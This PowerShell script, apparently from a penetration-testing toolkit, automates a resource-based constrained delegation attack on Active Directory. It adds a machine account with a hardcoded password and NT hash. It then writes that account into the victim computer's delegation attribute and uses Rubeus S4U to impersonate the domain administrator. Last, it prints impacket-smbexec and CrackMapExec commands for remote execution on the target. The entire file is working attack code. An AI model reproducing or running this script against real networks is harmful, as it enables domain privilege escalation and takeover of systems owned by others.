%dependency%

function Invoke-GodWrite
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Victim,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Position = 2)]
        [String]
        $DomainController,

        [Parameter(Position = 3)]
        [String]
        $NewComputerName = "sumikko",

        [Parameter(Position = 4)]
        [String]
        $NewPwd = "gurashi",

        [Parameter(Position = 5)]
        [String]
        $NewPwdNT = "B443EE718280006B2217770057027E88"
    )

    New-MachineAccount -MachineAccount $NewComputerName -Password $(ConvertTo-SecureString $NewPwd -AsPlainText -Force) -Domain $Domain
    Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $NewComputerName
    $sid =Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $NewComputerName -Properties objectsid | Select -Expand objectsid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
    $SDbytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDbytes, 0)
    Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $Victim | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Domain $Domain -Server $DomainController

    [Rubeus.Program]::MainString("s4u /user:$NewComputerName$ /rc4:$NewPwdNT /impersonateuser:administrator /msdsspn:CIFS/$Victim.$Domain /ptt /nowrap")
    $DCIP = (Resolve-DnsName -Name "$DomainController.$Domain").IPAddress
    $TGIP = (Resolve-DnsName -Name "$Victim.$Domain").IPAddress


    Write-Host "`nKRB5CCNAME=`$PWD/$Victim.cc impacket-smbexec -k -no-pass -dc-ip $DCIP -target-ip $TGIP administrator@$Victim.$Domain"
    Write-Host "`nAdd $TGIP $Victim.$Domain to /etc/hosts to use CME"
    Write-Host "KRB5CCNAME=`$PWD/$Victim.cc cme smb -k --kdcHost $DCIP $Victim.$Domain"
}
